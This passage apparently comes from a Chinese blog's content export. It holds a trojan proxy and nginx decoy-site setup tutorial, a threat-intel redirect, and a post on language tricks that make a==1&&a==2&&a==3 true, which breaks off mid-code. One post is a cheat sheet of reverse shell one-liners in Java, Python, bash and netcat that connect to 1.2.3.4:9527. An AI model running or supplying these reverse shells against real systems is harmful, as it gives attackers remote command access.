<code>/etc/letsencrypt/live/YOUR_DOMAIN/fullchain.pem</code></li><li><code>key</code>: 前面申请的域名证书私钥位置， 如 <code>/etc/letsencrypt/live/YOUR_DOMAIN/privkey.pem</code></li></ul><p><img src="./07.png"></p><p>最后启动 trojan 服务并设置为开机自启：</p><pre class="line-numbers language-shell"><code class="language-shell">systemctl start trojansystemctl enable trojan<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="安装-nginx"><a href="#安装-nginx" class="headerlink" title="安装 nginx"></a>安装 nginx</h3><p>以 CentOS 为例，安装命令为：</p><pre class="line-numbers language-shell"><code class="language-shell">yum install -y epel-release && yum install -y nginx<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装完成后，可把伪装站点的 HTML 文件上传到 <code>/usr/share/nginx/html</code> 目录。</p><p>修改 <code>/etc/nginx/conf.d/default.conf</code> 配置伪装站点的服务参数，参考配置如下（<strong>注意替换 YOUR_DOMAIN</strong>）：</p><pre><code>server {    listen 80;    server_name YOUR_DOMAIN www.YOUR_DOMAIN;    # rewrite ^(.*) https://$server_name$1 permanent;    return 302 https://$server_name:8443$request_uri;}server {    listen 8443 ssl;    server_name YOUR_DOMAIN www.YOUR_DOMAIN;    charset utf-8;    ssl_certificate /etc/letsencrypt/live/YOUR_DOMAIN/fullchain.pem;    ssl_certificate_key /etc/letsencrypt/live/YOUR_DOMAIN/privkey.pem;    # TLSv1.3需要nginx 1.13.0以上版本    ssl_protocols TLSv1.2 TLSv1.3;    # 如果nginx版本低，建议使用这种加密算法配置    # ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:ECDHE:ECDH:AES:HIGH:!NULL:!aNULL:!MD5:!ADH:!RC4;    ssl_ciphers ECDHE-RSA-AES256-GCM-SHA512:DHE-RSA-AES256-GCM-SHA512:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-SHA384;    ssl_ecdh_curve secp384r1;    ssl_prefer_server_ciphers on;    ssl_session_cache shared:SSL:10m;    ssl_session_timeout 10m;    ssl_session_tickets off;    keepalive_timeout 70;    location / {        root /usr/share/nginx/html;        index index.html index.htm;    }    error_page 500 502 503 504 /50x.html;    location = /50x.html {        root /usr/share/nginx/html;    }}</code></pre><p>最后启动 nginx 服务并设置为开机自启：</p><pre class="line-numbers language-shell"><code class="language-shell">systemctl start nginxsystemctl enable nginx<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>至此 trojan 服务安装完成。</p><h2 id="在-Docker-安装服务端（推荐）"><a href="#在-Docker-安装服务端（推荐）" class="headerlink" title="在 Docker 安装服务端（推荐）"></a>在 Docker 安装服务端（推荐）</h2><p>但是直接在宿主机上安装 trojan 服务比较繁琐，故我把前面的流程封装成 docker ，以便一键安装。</p><p>先在宿主机完成 docker、docker-compose、certbot 的安装，并按前述说明申请域名的 HTTPS 证书。</p><p>docker 构建源码已上传到 <a href="https://github.com/lyy289065406/trojan-docker">Github</a>， 主要的安装步骤如下：</p><pre class="line-numbers language-shell"><code class="language-shell"># 下载项目源码git clone https://github.com/lyy289065406/trojan-docker /usr/local/trojan-dockercd /usr/local/trojan-docker# 构建 docker 镜像# password 为之后客户端连接 trojan 的密码# domain 为前面准备好的域名password=YOUR_PASSWORD domain=YOUR_DOMAIN docker-compose build# 刷新证书有效期，并复制宿主机的 HTTPS 证书到 docker 容器# 建议把此脚本设置到 crontab 定时执行./renew_cert.sh# 在后台启动 trojan 服务docker-compose up -d<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后把 <code>/usr/local/trojan-docker/nginx/html</code> 下的内容替换为伪装站点的 HTML 内容即可。</p><p>至此 trojan 服务安装完成。</p><h2 id="安装-PC-客户端（Windows-Mac-Linux）"><a href="#安装-PC-客户端（Windows-Mac-Linux）" class="headerlink" title="安装 PC 客户端（Windows / Mac / Linux）"></a>安装 PC 客户端（Windows / Mac / Linux）</h2><h3 id="安装-Qv2ray"><a href="#安装-Qv2ray" class="headerlink" title="安装 Qv2ray"></a>安装 Qv2ray</h3><p>trojan 的客户端有很多，推荐使用 <a href="https://github.com/Qv2ray/Qv2ray">Qv2ray</a>， 支持 Windows / Mac / Linux 全平台。</p><p>安装步骤参考 <a href="https://qv2ray.net/getting-started/">官方手册</a> 即可。</p><p>安装完成后，在 【添加】 =&gt; 【订阅/手动输入】 =&gt; 【打开连接编辑器】 填写 域名 和 trojan 服务端设置的密码即可连接到 trojan 服务端。</p><p><img src="./09.png"></p><h3 id="Chrome-配置-Proxy-SwitchyOmega"><a href="#Chrome-配置-Proxy-SwitchyOmega" class="headerlink" title="Chrome 配置 Proxy SwitchyOmega"></a>Chrome 配置 Proxy SwitchyOmega</h3><p>但仅仅是连接到 trojan 服务端并不能访问外网，还需要把本地流量导向 Qv2ray 。</p><p>通过 【首选项】 =&gt; 【入站设置】 可以看见 Qv2ray 在本地启动了 SOCK5:1088 和 HTTP:8888 两个代理服务。</p><p><img src="./10.png"></p><p>此时只能通过系统全局代理把本地流量导向 Qv2ray ，但因为是全局代理，十分不方便：</p><p><img src="./11.png"></p><p>建议在 <a href="https://www.google.cn/chrome/">Chrome</a> 浏览器安装 <a href="https://chrome.google.com/webstore/detail/proxy-switchyomega/padekgcemlokbadohgkifijomclgjgif?hl=zh-CN">Proxy SwitchyOmega</a> 插件（需科学上网），新建情景模式配置 SOCK5:1088 代理服务，再利用 auto switch 根据域名条件按需把流量导向 Qv2ray 即可。</p><p><img src="./12.png"></p><p><img src="./13.png"></p><h2 id="安装手机客户端（Android）"><a href="#安装手机客户端（Android）" class="headerlink" title="安装手机客户端（Android）"></a>安装手机客户端（Android）</h2><p>官方提供了 <a href="https://github.com/trojan-gfw/igniter">igniter</a> 客户端，安装后填写 域名 和 trojan 服务端设置的密码即可直接使用。</p><p><img src="./08.png"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>《<a href="https://tlanyan.me/trojan-tutorial/#prepare">trojan教程</a>》</li><li>《<a href="https://trojan-tutor.github.io/2019/04/10/p41.html">自建梯子教程 –Trojan版本</a>》</li><li>《<a href="https://www.freesion.com/article/5576153940/">CENTOS7 搭建TROJAN实现”代理上网”</a>》</li><li>《<a href="https://www.rultr.com/tutorials/3863.html">Trojan 与 Nginx 配合使用域名证书提供服务</a>》</li><li>《<a href="https://tlanyan.me/use-lets-encrypt-certificate/">使用Let’s Encrypt获取免费证书</a>》</li><li>《<a href="https://tlanyan.me/trojan-clients-download/">trojan客户端下载</a>》</li><li>《<a href="https://ssr.tools/1604">Trojan-Qt5下载及使用教程</a>》</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络协议 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VPS </tag>
            
            <tag> 科学上网 </tag>
            
            <tag> 翻墙 </tag>
            
            <tag> 梯子 </tag>
            
            <tag> trojan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>各种语言的一句话反弹 shell 命令</title>
      <link href="/safe/ge-chong-yu-yan-yi-ju-hua-fan-dan-shell/"/>
      <url>/safe/ge-chong-yu-yan-yi-ju-hua-fan-dan-shell/</url>
      
        <content type="html"><![CDATA[<h2 id="被攻击主机先监听端口"><a href="#被攻击主机先监听端口" class="headerlink" title="被攻击主机先监听端口"></a>被攻击主机先监听端口</h2><p>这是大前提，至于怎么做就看 hacker 的能力了，最简单脚本可以用 nc ：</p><pre class="line-numbers language-bash"><code class="language-bash">nc -lvvp 9527<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="攻击主机连接到服务端口"><a href="#攻击主机连接到服务端口" class="headerlink" title="攻击主机连接到服务端口"></a>攻击主机连接到服务端口</h2><h3 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h3><pre class="line-numbers language-java"><code class="language-java">Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/bash"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"exec 5&lt;>/dev/tcp/1.2.3.4/9527;cat &lt;&amp;5 | while read line; do \$line 2>&amp;5 >&amp;5; done"</span><span class="token punctuation">]</span> as String<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><pre class="line-numbers language-python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("1.2.3.4",9527));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">bash</span> -i <span class="token operator">></span><span class="token operator">&amp;</span> /dev/tcp/1.2.3.4/9527 0<span class="token operator">></span><span class="token operator">&amp;</span>1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h3><pre class="line-numbers language-bash"><code class="language-bash">nc -e /bin/sh 1.2.3.4 9527<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mknod</span> /tmp/backpipe p/bin/sh 0<span class="token operator">&lt;</span>/tmp/backpipe <span class="token operator">|</span> nc 1.2.3.4 9527 1<span class="token operator">></span>/tmp/backpipe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>威胁情报播报</title>
      <link href="/safe/threat-broadcast/"/>
      <url>/safe/threat-broadcast/</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://lyy289065406.github.io/threat-broadcast/">正在重定向到内容页面 ……</a></p></blockquote><p><a href="https://lyy289065406.github.io/threat-broadcast/">如果您的浏览器没有自动跳转， 请点击这里</a></p>    <!-- 自动跳转 -->    <meta http-equiv="refresh" content="0; url=https://lyy289065406.github.io/threat-broadcast/"><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> 威胁情报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何令永假式成真？</title>
      <link href="/safe/ru-he-ling-yong-jia-shi-cheng-zhen/"/>
      <url>/safe/ru-he-ling-yong-jia-shi-cheng-zhen/</url>
      
        <content type="html"><![CDATA[<p>最近在 <a href="https://stackoverflow.com/questions/48270127/can-a-1-a-2-a-3-ever-evaluate-to-true">Stack Overflow</a> 无意中发现一个挺有意思的问题：</p><blockquote><p>是否可以令永假式 <code>a == 1 &amp;&amp; a == 2 &amp;&amp; a == 3</code> 的值为 <code>true</code> ？**</p></blockquote><h2 id="C"><a href="#C" class="headerlink" title="C++"></a>C++</h2><p>当时看到题干，条件反射就想到了可以通过 C++ 实现，因为 C++ 是可以重写运算符的，其实现代码如下：</p><pre class="line-numbers language-cpp"><code class="language-cpp"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">NumOP</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span><span class="token operator">:</span>        <span class="token keyword">int</span> num<span class="token punctuation">;</span>    <span class="token keyword">public</span><span class="token operator">:</span>        <span class="token function">NumOP</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>num <span class="token operator">=</span> num<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">bool</span> <span class="token keyword">operator</span><span class="token operator">==</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> num<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token operator">-</span><span class="token operator">></span>num <span class="token operator">&lt;=</span> num<span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    NumOP <span class="token function">a</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"impossable!"</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        cout <span class="token operator">&lt;&lt;</span> <span class="token string">"It's right."</span> <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为闲得慌，又萌生出了一个念头：其他语言是否也都可以实现这个表达式呢？</p><p>其实仔细分分析一下题干，要使得表达式成真，可以从两个思路切入：</p><ul><li>(1) 要么 <code>==</code> 的判定逻辑被篡改</li><li>(2) 要么 <code>a</code> 的值要在判断过程中自动变化，此时 <code>a</code> 不可能是基础数据类型（可能是对象、是函数、或是引用）</li></ul><h2 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h2><p>因为 Python 和 C++ 同样支持运算符重写，于是类似地可以得到 Python 的实现代码：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">NumOP</span> <span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> num<span class="token punctuation">)</span> <span class="token punctuation">:</span>        self<span class="token punctuation">.</span>num <span class="token operator">=</span> num    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> num<span class="token punctuation">)</span> <span class="token punctuation">:</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>num <span class="token operator">&lt;=</span> num<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>    a <span class="token operator">=</span> NumOP<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">and</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">and</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"impossable!"</span><span class="token punctuation">)</span>    <span class="token keyword">else</span> <span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"It's right."</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span> <span class="token punctuation">:</span>    main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Ruby"><a href="#Ruby" class="headerlink" title="Ruby"></a>Ruby</h2><p>而对于 ruby 则可以利用它的一个语法糖简单实现：调用函数函数时，其参数列表可以不写括号。</p><p>那么只需要定义一个无入参的函数 <code>a</code> ，根据条件动态控制函数 <code>a</code> 的返回值即可，其实现代码如下：</p><pre class="line-numbers language-ruby"><code class="language-ruby"><span class="token keyword">def</span> a    <span class="token variable">$i</span> <span class="token operator">||</span><span class="token operator">=</span> <span class="token number">0</span>    <span class="token comment" spellcheck="true"># $i 是全局变量</span>    <span class="token variable">$i</span> <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">end</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span>    puts <span class="token string">"impossable!"</span><span class="token keyword">else</span>    puts <span class="token string">"It's right."</span><span class="token keyword">end</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h2><p>对于 JavaScript ，可以利用运算符 <code>==</code> 的松散相等特性：当 <code>==</code> 两边操作数的类型不相同时， JS 引擎会尝试把其中一个操作数类型转换成另一个操作数类型。</p><p>在这题里面，若左侧操作数 <code>a</code> 是对象，右侧是数字，则会隐式调用对象 <code>a</code> 的 <code>valueOf</code> 方法将其转换成数字；若转换失败则调用 <code>toString</code> 方法后再将其转换成数字。</p><p>显然，只需要控制 <code>valueOf</code> 逻辑使其满足每次 <code>==</code> 的判定即可，其实现代码如下：</p><blockquote><p>注：此方法对于严格相等运算符 <code>===</code> 不起作用。</p></blockquote><pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token punctuation">{</span>    i<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>     valueOf<span class="token punctuation">:</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>i<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"impossable!"</span><span class="token punctuation">)</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"It's right."</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h2><p>这么多语言中，最麻烦的就是 Java 了。主要是 Java 不允许重写运算符，只能利用 <code>a</code> 做文章。</p><p>但 Java 要求 <code>==</code> 两边类型一致，而右侧的 <code>1</code>/<code>2</code>/<code>3</code> 是 <code>int</code> 基础类型，因此 <code>a</code> 会受到 Java 的 <strong>编译语法</strong> 约束，只可能是 <code>int</code> 基础类型或其包装类 <code>Integer</code>。而结合本题来看，<code>a</code> 只可能是 <code>Integer</code> 对象。</p><p>根据 Java 的语言特性，<code>Integer == int</code> 在比对之前，会自动拆包使得两边的类型一致，事实上会变成 <code>Integer.intValue() == int</code>。</p><p>理论上本应只需要重写 <code>Integer.intValue()</code> 即可。</p><p>而事实上 <code>Integer</code> 声明了 <code>final</code>，不允许被继承，直接导致无法重写 <code>Integer.intValue()</code>。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">Integer</span> <span class="token keyword">extends</span> <span class="token class-name">Number</span> <span class="token keyword">implements</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>Integer<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">intValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> value<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>换言之无法直接实现。</p><p>但是若条件变更如下，则有可能实现：</p><pre class="line-numbers language-java"><code class="language-java">a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> a <span class="token operator">==</span> <span class="token punctuation">(</span>Integer<span class="token punctuation">)</span> <span class="token number">3</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>该条件比对的是 <code>Integer == Integer</code>，由于两侧操作数均是对象，实际比对的是对象地址的引用，只需要想办法篡改两个引用的对象（使其相同）即可达到目的。</p><hr><p>此时可以利用 Java【静态缓存】的特性 —— <code>Integer</code> 为了优化空间和效率，对于特定范围的常量值会放入常量池：</p><ul><li>当 <code>Integer</code> 类 <strong>第一次</strong> 被载入内存时，会通过内部类 <code>IntegerCache</code> 把 <code>[-128, 127]</code> 范围内的整数包装成 <code>Integer</code> 对象并缓存到 <code>Integer cache[]</code> 数组。</li><li>以后再用 <code>Integer</code> 初始化变量时，若其赋值范围在 <code>[-128, 127]</code> 之间，则直接返回 <code>cache</code> 数组中对应的引用，不再重新开辟内存。</li></ul><p>详细可见 <code>Integer</code> 的源码：</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">class</span> <span class="token class-name">Integer</span> <span class="token keyword">extends</span> <span class="token class-name">Number</span> <span class="token keyword">implements</span> <span class="token class-name">Comparable</span><span class="token operator">&lt;</span>Integer<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">IntegerCache</span> <span class="token punctuation">{</span>        <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> low <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">128</span><span class="token punctuation">;</span>        <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> high<span class="token punctuation">;</span>        <span class="token keyword">static</span> <span class="token keyword">final</span> Integer cache<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">static</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// high value may be configured by property</span>            <span class="token keyword">int</span> h <span class="token operator">=</span> <span class="token number">127</span><span class="token punctuation">;</span>            String integerCacheHighPropValue <span class="token operator">=</span>                VM<span class="token punctuation">.</span><span class="token function">getSavedProperty</span><span class="token punctuation">(</span><span class="token string">"java.lang.Integer.IntegerCache.high"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>integerCacheHighPropValue <span class="token operator">!=</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">try</span> <span class="token punctuation">{</span>                    <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>integerCacheHighPropValue<span class="token punctuation">)</span><span class="token punctuation">;</span>                    i <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment" spellcheck="true">// Maximum array size is Integer.MAX_VALUE</span>                    h <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> Integer<span class="token punctuation">.</span>MAX_VALUE <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token operator">-</span>low<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span> <span class="token keyword">catch</span><span class="token punctuation">(</span> NumberFormatException nfe<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token comment" spellcheck="true">// If the property cannot be parsed into an int, ignore it.</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>            high <span class="token operator">=</span> h<span class="token punctuation">;</span>            cache <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">[</span><span class="token punctuation">(</span>high <span class="token operator">-</span> low<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> j <span class="token operator">=</span> low<span class="token punctuation">;</span>            <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> cache<span class="token punctuation">.</span>length<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>                cache<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Integer</span><span class="token punctuation">(</span>j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">// range [-128, 127] must be interned (JLS7 5.1.7)</span>            <span class="token keyword">assert</span> IntegerCache<span class="token punctuation">.</span>high <span class="token operator">>=</span> <span class="token number">127</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token function">IntegerCache</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * Returns an {@code Integer} instance representing the specified     * {@code int} value.  If a new {@code Integer} instance is not     * required, this method should generally be used in preference to     * the constructor {@link #Integer(int)}, as this method is likely     * to yield significantly better space and time performance by     * caching frequently requested values.     *     * This method will always cache values in the range -128 to 127,     * inclusive, and may cache other values outside of this range.     *     * @param  i an {@code int} value.     * @return an {@code Integer} instance representing {@code i}.     * @since  1.5     */</span>    <span class="token annotation punctuation">@HotSpotIntrinsicCandidate</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Integer <span class="token function">valueOf</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">>=</span> IntegerCache<span class="token punctuation">.</span>low <span class="token operator">&amp;&amp;</span> i <span class="token operator">&lt;=</span> IntegerCache<span class="token 